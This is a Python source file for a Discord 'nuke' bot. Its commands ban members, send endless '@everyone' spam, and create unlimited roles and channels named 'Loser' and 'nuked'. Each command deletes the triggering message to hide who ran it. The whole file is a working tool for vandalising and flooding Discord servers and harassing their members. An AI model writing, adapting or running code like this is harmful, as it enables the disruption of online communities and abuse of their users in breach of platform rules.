import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get

bot = commands.Bot(command_prefix='!')
client = commands.Bot(command_prefix='!')

bot.remove_command('help')

@bot.event
async def on_ready():
    print("Bot Is Online! Getting Ready To Spam.")
    print(f"Bot Status: Online!...")

@bot.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

@bot.command(pass_context=True)
async def spam(ctx): #run "!spam" to run the command
    await ctx.message.delete()
    while True:
        await ctx.send("Why so ez? @everyone")

@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Loser")

@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    while True:
        await guild.create_text_channel('nuked')

bot.run ("YOUR TOKEN")
